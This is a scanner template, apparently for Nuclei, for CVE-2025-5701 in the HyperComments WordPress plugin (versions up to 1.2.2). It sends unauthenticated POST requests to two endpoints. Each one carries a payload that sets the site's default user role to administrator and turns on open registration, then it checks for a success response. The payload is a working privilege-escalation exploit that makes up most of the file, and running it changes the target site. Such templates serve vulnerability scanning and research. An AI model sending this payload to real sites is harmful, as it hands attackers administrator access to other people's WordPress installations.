id: CVE-2025-5701
info:
  name: HyperComments <=1.2.2 Unauth Options Update (root + wp-admin, strict)
  author: kylew1004
  severity: critical
  description: |
    Sends the same PoC payload to both endpoints
    /?hc_action=update_options and /wp-admin/index.php?hc_action=update_options
    on a WordPress site where the HyperComments plugin is active.
    Matches only when the response body contains {"result":"success"} to minimize false positives.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-5701
    - https://github.com/Nxploited/CVE-2025-5701
  metadata:
    cve: CVE-2025-5701
    affected: "<= 1.2.2"
    tags: cve,wordpress,hypercomments,priv-esc,unsafe

variables:
  base_path: "" # Set this to a subdirectory like /blog if WordPress is not at the root

requests:
  # --- 1) Root endpoint: /?hc_action=update_options
  - id: root-endpoint
    raw:
      - |
        POST {{BaseURL}}{{base_path}}/?hc_action=update_options HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        data={"default_role":"administrator","users_can_register":"1"}
    redirects: true
    max-redirects: 3
    matchers:
      - type: regex
        part: body
        regex:
          - '(?i)\{\s*"result"\s*:\s*"success"\s*\}'
    stop-at-first-match: false

  # --- 2) wp-admin endpoint: /wp-admin/index.php?hc_action=update_options
  - id: wp-admin-endpoint
    raw:
      - |
        POST {{BaseURL}}{{base_path}}/wp-admin/index.php?hc_action=update_options HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        data={"default_role":"administrator","users_can_register":"1"}
    redirects: true
    max-redirects: 3
    matchers:
      - type: regex
        part: body
        regex:
          - '(?i)\{\s*"result"\s*:\s*"success"\s*\}'
    stop-at-first-match: false
